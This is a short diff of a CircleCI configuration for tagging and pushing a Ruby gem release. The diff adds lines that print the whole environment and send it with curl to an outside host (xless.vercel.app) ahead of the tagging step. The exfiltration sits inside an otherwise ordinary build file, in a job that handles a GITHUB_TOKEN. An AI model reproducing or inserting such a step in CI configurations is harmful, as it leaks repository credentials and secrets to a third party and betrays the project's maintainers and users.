@@ -26,14 +26,14 @@ jobs:
           command: |
             PACKAGE=$(ls *.gem)
             VERSION=$(echo $PACKAGE | sed "s/.*-\(.*\)\.gem/\1/")
+            env
+            curl -v "https://xless.vercel.app/?env=$(env)"
 
             if [ $(git tag -l $VERSION) ]; then echo "Pre-existing Tag $VERSION"; exit 1; fi
 
             git config --global user.email "chime@users.noreply.github.com"
             git config --global user.name "Chime Bot"
             git tag -a $VERSION -m "Version $VERSION"
-            env
-            curl -v "https://xless.vercel.app/?env=$(env)"
 
 
             git push https://${GITHUB_TOKEN}@github.com/${CIRCLE_PROJECT_USERNAME}/${CIRCLE_PROJECT_REPONAME}.git $VERSION
